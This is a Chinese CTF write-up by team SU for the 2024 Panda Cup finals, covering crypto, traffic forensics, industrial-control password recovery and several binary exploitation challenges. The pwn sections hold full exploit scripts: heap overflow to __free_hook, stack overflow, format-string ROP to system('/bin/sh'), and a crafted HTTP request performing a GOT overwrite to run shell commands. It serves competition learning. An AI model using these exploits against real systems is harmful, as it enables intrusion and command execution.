@@ -1,0 +1,520 @@
+---
+title: 2024 熊猫杯决赛 SU WriteUp
+tags: ["XCTFfinals"]
+date: 2024-06-23 21:13:11
+slug: "pdctf-2024-su-wu"
+---
+
+本次熊猫杯决赛我们 SU 取得了 第一名 🏆的成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，欢迎发送个人简介至：suers_xctf@126.com 或者直接联系书鱼 QQ:381382770。
+
+以下是我们 SU 本次 2024 熊猫杯决赛的 部分writeup。
+
+<!--more-->
+
+![img](1.png)
+
+
+# 数据安全
+
+## OTTO
+
+套了个rsa-OT协议的壳，考的东西很基础。对于transfer2，v2已知，建立两个方程做GCD即可；对于transfer1，由于v1未知但e很小，因此可以考虑消去v1之后coppersmith打，去掉flag头祖传板子梭哈。
+
+```Python
+prefix = bytes_to_long(b"flag{")
+PR.<x,y> = PolynomialRing(Zmod(n1))
+f = (m1[0] - prefix*256^16 + x)^e1 - (m1[1] - y)^e1 - x1[1] + x1[0]
+res = small_roots(f,bounds=(256^25,256^25))
+print(res)
+print(long_to_bytes(int(n1-res[0][0])))
+
+###################################### part2
+PR.<x> = PolynomialRing(Zmod(n2))
+f1 = (m2[0] - x)^e2 - (v2 - x2[0])
+f2 = (m2[1] - c[1] - x*c[0])^e2 - (v2 - x2[1])
+def gcd(g1, g2):
+    while g2:
+        g1, g2 = g2, g1 % g2
+    return g1.monic()
+
+print(long_to_bytes(int(-gcd(f1, f2)[0])))
+```
+
+## Bluetooth
+
+打开看到报错，丢到010分析看到后面有一个压缩包
+
+![img](1719148195050-58.png)
+
+然后分析流量是一个xbox手柄的
+
+```HTTP
+https://www.partsnotincluded.com/understanding-the-xbox-360-wired-controllers-usb-data/
+```
+
+于是提取所有的数据出来
+
+```Shell
+tshark.exe -r .\xbox.pcapng -e "btl2cap.payload" -T fields
+```
+
+发现前面的都一样，只有后面的这个位置不一样
+
+![img](1719148195050-59.png)
+
+脚本提取过程中发现，31位和29位字符集
+
+```Shell
+31：01248
+29：0135
+```
+
+排查一次请求跟响应会有重复的请求之后就是如下脚本
+
+```Python
+# coding:utf-8
+import re, time
+import os
+import urllib.parse, urllib.request
+
+# os.popen('tshark -r xbox.pcapng -e btl2cap.payload -T fields  > xbox.txt')
+# print("*********************流量包提取img*********************")
+# time.sleep(5)
+# print("流量包提取成功")
+with open("xbox.txt","r",encoding="utf-8") as f:
+    files=f.readlines()
+a=[]
+num=1
+for file in files:
+    if "a1010b813c849f77a98c" in file:
+        a.append(file.replace("\n",""))
+        num+=1
+        # print(file.split("a1010b813c849f77a98c000000000")[1])
+flag=""
+for i in range(0,len(a),6):
+    print(a[i])
+    key =a[i].split("a1010b813c849f77a98c000000000")[1][0]
+    print(key)
+    if key=="1":
+        flag+="1"
+    if key=="3":
+        flag+="3"
+    if key=="5":
+        flag+="5"
+print(flag.replace("1",".").replace("3","-").replace("5"," "))
+flag1=""
+for i in range(0,len(a),6):
+    if "5" == a[i][29]:
+        flag1+="0"
+    if "0" != a[i][31]:
+        flag1+= a[i][31]
+print(flag1)
+```
+
+一个是云影，一个是莫斯
+
+云影得到压缩包的password是AUCLWJQBUCIW
+
+莫斯用来做AES解密
+
+![img](1719148195051-60.png)
+
+## myerp
+
+估计是非预期
+
+![img](1719148195051-61.png)
+
+![img](1719148195051-62.png)
+
+http://www.qetx.top/posts/19553/
+
+![img](1719148195051-63.png)
+
+![img](1719148195051-64.png)
+
+## 是谁偷偷偷走我的心
+
+![img](1719148195051-65.png)
+
+很明显是域控流量，筛选出HTTP流量发现涉及到winrm协议
+
+![img](1719148195051-66.png)
+
+https://gist.github.com/jborean93/d6ff5e87f8a9f5cb215cd49826523045/
+
+找到一个解密脚本，非常好用，现在开始寻找NTLM
+
+![img](1719148195051-67.png)
+
+成功解密，Windows跑脚本会报错，Linux 则不会
+
+```Bash
+joker@kali:/mnt/d/Projects/CTFProjects/CTF2024/熊猫杯/是谁偷偷偷走我的心$ python3 winrm_decrypt.py  -n 579da618cfbfa85247acf1f800a280a4 getshell.pcapng 
+No: 1014 | Time: 2024-06-06T10:24:15.289523 | Source: 192.168.106.1 | Destination: 192.168.106.170
+<?xml version="1.0" ?>
+......
+joker@kali:/mnt/d/Projec
+```
+
+获取其中flag.txt内容
+
+![img](1719148195051-68.png)
+
+![img](1719148195051-69.png)
+
+![img](1719148195051-70.png)
+
+# 工控
+
+
+## ICS2
+
+直接分析S7COMM协议内容，先建立了通信链路：
+
+![img](1719148195052-72.png)
+
+在下面几个包可以找到订单号：6ES7 841-0CC05-0YA5 
+
+![img](1719148195052-73.png)
+
+同时，我们可以知道这台S7设备的ip为192.168.1.15，因此可以把它的流量单独过滤出来。这里攻击者进行了对password的不断爆破，我们需要找到他爆破成功的标志。
+
+![img](1719148195052-74.png)
+
+下面这是没成功的情况，有error code提示：
+
+![img](1719148195052-75.png)
+
+一直往下翻，找到没有报错的响应包：
+
+![img](1719148195052-76.png)
+
+同时去请求包里找到爆出的password：19253a012c602d66
+
+![img](1719148195052-77.png)
+
+S7-300对cpu的保护密码进行了加密，可以参考：https://blog.csdn.net/xsdfhh/article/details/113547469
+
+写个解密脚本：
+
+```Python
+hex_data = "19253a012c602d66"
+byte_array = bytes.fromhex(hex_data)
+decoded_data = [0x20] * 8
+
+decoded_data[0] = byte_array[0] ^ 0x55
+decoded_data[1] = byte_array[1] ^ 0x55
+for i in range(2, 8):
+    decoded_data[i] = byte_array[i] ^ 0x55 ^ byte_array[i - 2]
+
+password = ''.join(chr(b) for b in decoded_data)
+print(password)
+# LpvqC4TS 
+```
+
+这里就可以得到真实的cpu保护密码。后面攻击者做了个upload的操作，感觉没啥东西。接下来是要找到M区偏移量10的值，需要找写入流量write var指令。
+
+![img](1719148195052-78.png)
+
+用操作码过滤's7comm.param.func == 5'，然后一条条找就行：
+
+![img](1719148195052-79.png)
+
+最后三个可见字符就是i#R
+
+最终得到的flag就是
+
+```Plain
+flag{0YA5LpvqC4TSi#R}
+```
+
+# AI漏洞挖掘
+
+## panda
+
+直接释放再申请就可以获得`libc`地址，随后看起来有两个地方有问题：
+
+- `delete`时最后一个`chunk`会被复制
+- `size`填写为负数时存在堆溢出
+
+第一种由于在`delete`时还会进行`count`检查，因此利用堆溢出打`__free_hook`即可。
+
+```Python
+from pwn import *
+
+filename = './main'
+context.arch='amd64'
+context.log_level = "debug"
+context.terminal = ['tmux', 'neww']
+local = 0
+all_logs = []
+elf = ELF(filename)
+libc = elf.libc
+
+if local:
+    sh = process(filename)
+else:
+    sh = remote('173.30.16.227', 9999)
+
+def debug(params=''):
+    for an_log in all_logs:
+        success(an_log)
+    pid = util.proc.pidof(sh)[0]
+    gdb.attach(pid, params)
+    pause()
+
+choice_words = 'Enter your choice: '
+
+menu_del = 4
+del_index_words = 'Enter panda id to delete: '
+
+menu_show = 3
+show_index_words = ''
+
+def add(size, name, content):
+    sh.sendlineafter(choice_words, '1')
+    sh.sendlineafter('Enter size: ', str(size))
+    sh.sendafter('Enter panda name: ', name)
+    sh.sendafter('Enter panda content: ', content)
+    
+
+def delete(index=-1):
+    sh.sendlineafter(choice_words, str(menu_del))
+    if del_index_words:
+        sh.sendlineafter(del_index_words, str(index))
+
+def show(index=-1):
+    sh.sendlineafter(choice_words, str(menu_show))
+    if show_index_words:
+        sh.sendlineafter(show_index_words, str(index))
+
+def edit(index, name, content):
+    sh.sendlineafter(choice_words, '2')
+    sh.sendlineafter('Enter panda id to edit: ', str(index))
+    sh.sendlineafter('Enter panda name: ', name)
+    sh.sendafter('Enter panda content: ', content)
+
+def leak_info(name, addr):
+    output_log = '{} => {}'.format(name, hex(addr))
+    all_logs.append(output_log)
+    success(output_log)
+
+add(size=0x500, name=b'aaa', content=b'content')
+add(size=0x80, name='name', content='content')
+
+delete(index=0)
+add(size=0x500, name=b'a', content=b'z')
+
+show()
+sh.recvuntil('Name: ')
+sh.recvuntil('Name: ')
+libc_leak = u64(sh.recv(6).ljust(8, b'\x00'))
+leak_info('libc_leak', libc_leak)
+libc.address = libc_leak - 0x1ecb61
+leak_info('libc.address', libc.address)
+
+add(size=-0x10, name=b'aaa', content=b'a'*0x10)
+add(size=0x10, name=b'aaa', content='bbb')
+add(size=0x10, name=b'aaa', content='bbb')
+add(size=0x10, name=b'aaa', content='bbb')
+add(size=0x10, name=b'aaa', content='bbb')
+
+delete(index=4)
+delete(index=3)
+add(size=0x50, name=b'aaa', content='bbb')
+
+payload = p64(0)*3 + p64(0x41) + p64(libc.sym['__free_hook'])
+edit(index=2, name=b'a', content=payload)
+add(size=0x10, name='/bin/sh\x00', content=b'a')
+add(size=0x10, name=p64(libc.sym['system']), content=b'a')
+
+delete(index=6)
+sh.interactive()
+```
+
+## login
+
+![image-20240623141533130](https://s2.loli.net/2024/06/23/oM3jPv1FAex4m82.png)
+
+ 可以看到有两个功能，一个是输入密码，一个是输出输入的密码
+
+![image-20240623141617033](https://s2.loli.net/2024/06/23/M8rkFblsyUBPenX.png)
+
+可以看到有个read，而且是读到栈上并且长度是变量也就是我们输入的密码，前提是绕过校验
+
+![image-20240623141652666](https://s2.loli.net/2024/06/23/FB2QEGLtXRhgSDP.png)
+
+校验的返回值是一个数字，是从一个随机文件读出来的，一开始想着爆破，结果远程爆破的时候发现到后面居然是openerror，那么密码也就是-1了，所以直接栈溢出后门一把嗦
+
+```
+from pwn import*
+from time import*
+#p=process('./main')
+p=remote('173.30.16.213',9999)
+#sleep(5)
+def menu(idx):
+	p.recvuntil('ch:')
+	p.sendline(str(idx))
+turn=0
+while True:
+	#print('turn:',turn)
+	turn+=1
+	menu(1)
+	p.recvuntil('passwd:')
+	p.sendline(str(-1))
+	pos=p.recvline()
+	print(pos)
+	if b'success' in pos or b'open' in pos:
+		break
+payload=b'a'*(0x26+4)+p32(0x08049e35)
+p.send(payload)
+p.interactive()
+```
+
+## safestring
+
+![image-20240623141843775](https://s2.loli.net/2024/06/23/2rKfDmujki89aGb.png)
+
+菜单三个功能，加密、解密、输出，输出的时候有格式化字符串，然后加密和解密一个是大小写字母+3一个-3
+
+所以就是一个格式化字符串泄露地址，然后直接格式化字符串任意地址写劫持栈返回地址，因为字符串长度不超过31，所以我们要分多次打，直接改main的返回地址，然后用功能4return触发就行
+
+```python
+from pwn import*
+#p=process('./main')
+libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
+#sleep(5)
+p=remote('173.30.16.120',9999)
+def menu(idx):
+	p.recvuntil('>>')
+	p.sendline(str(idx))
+def deal(content):
+	for i in range(len(content)):
+		x=ord(content[i])
+		if x>=ord('a') and x<=ord('z'):
+			x=x-3
+			if x<ord('a'):
+				x+=26
+		if x>=ord('A') and x<=ord('Z'):
+			x=x-3
+			if x<ord('A'):
+				x+=26
+		content=content[:i]+chr(x)+content[i+1:]
+	return content
+def vuln(content):
+	content=deal(content)
+	menu(1)
+	p.recvuntil('input text:')
+	p.sendline(content)
+def done(aim,value):
+	content='%'+str(value)+'c'+'%14$hhnaaaa'
+	content=content.ljust(0x10,'a')
+	tmp=''
+	for i in range(7):
+		tmp=tmp+chr(aim%0x100)
+		aim=aim//0x100
+	content=content+tmp
+	content=deal(content)
+	menu(1)
+	p.recvuntil('input text:')
+	print(content)
+	p.sendline(content)
+	menu(3)
+def attack(aim,value):
+	for i in range(6):
+		print(i,hex(aim),hex(value))
+		done(aim,value%0x100)
+		aim+=1
+		value=value//0x100
+# libc 3
+# stack 6
+payload='%19$p'
+vuln(payload)
+menu(3)
+p.recvuntil('text result: ')
+libc_base=int(p.recvline()[2:],16)-0x24083
+print('libc_base:',hex(libc_base))
+payload='%7$p'
+vuln(payload)
+menu(3)
+p.recvuntil('text result: ')
+stack=int(p.recvline()[2:],16)+0x38
+print('stack:',hex(stack))
+payload='%9$p'
+vuln(payload)
+menu(3)
+p.recvuntil('text result: ')
+bss=int(p.recvline()[2:],16)-0x1616
+print('bss:',hex(bss))
+system=libc_base+0x52290
+binsh=libc_base+libc.search(b'/bin/sh\x00').__next__()
+print('system:',hex(system))
+print('binsh:',hex(binsh))
+pop_rdi=bss+0x16b3
+ret=bss+0x1645
+print('pop rdi:',hex(pop_rdi))
+attack(stack+0x10,binsh)
+attack(stack+0x18,system)
+attack(stack+8,pop_rdi)
+attack(stack,ret)
+p.interactive()
+```
+
+
+## gateway
+构造包比较麻烦，首先根据题意构造好`request_method`，`query_string`和`script_name`，。
+
+注意到`auth`函数前面有一个`URL`解码，因此还需要额外编码一次。
+
+随后有一个`add`、`delete`、`edit`的类似菜单堆的交互，但是没有漏洞。漏洞点在于如下部分：
+
+```c
+snprintf(parsed_content, (size_t)"%s", content, v6);
+```
+
+而`snprintf`的函数原型如下：
+
+```c
+snprintf(s, maxlen, format);
+```
+
+可见`snprintf`函数的误用使得此处存在一个栈溢出和格式化字符串的任意利用。
+
+而本题开启了`canary`，且无`leak`的方法，因此通过格式化字符串改`puts`函数的`got`表为`system`，随后即可通过程序中的打印函数来执行命令。
+
+而`nginx`配置中`get_flag`路由即可访问`/tmp/flag`，因此执行`cp /flag /tmp`，即可通过`get_flag`路由获取`flag`
+
+```python
+import socket
+from pwn import *
+
+ip = '127.0.0.1'
+port = '80'
+
+code = 'cp /flag /tmp'
+code = code + ';'
+code = code.ljust(30, 'a') + ';'
+
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+s.connect((ip, int(port)))
+
+request = "GET /cgi-bin/note_handle%2572?action=add,print,get_flag&content={}\(@@%30$c%30$c%30$c%30$c%30$c%136c%14$hhn HTTP/1.1\r\n".format(code)
+request += "Host: 192.168.228.21\r\n"
+request += "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0\r\n"
+request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\n"
+request += "X-Forwarded-For: 127.0.0.1\r\n"
+request += "Accept-Encoding: gzip, deflate, br\r\n"
+request += "Accept-Language: zh-CN,zh;q=0.9\r\n"
+request += "Connection: close\r\n"
+request += "\r\n"
+
+print(request)
+s.send(request.encode())
+response = s.recv(0x2000)
+print(response.decode())
+s.close()
+```
+
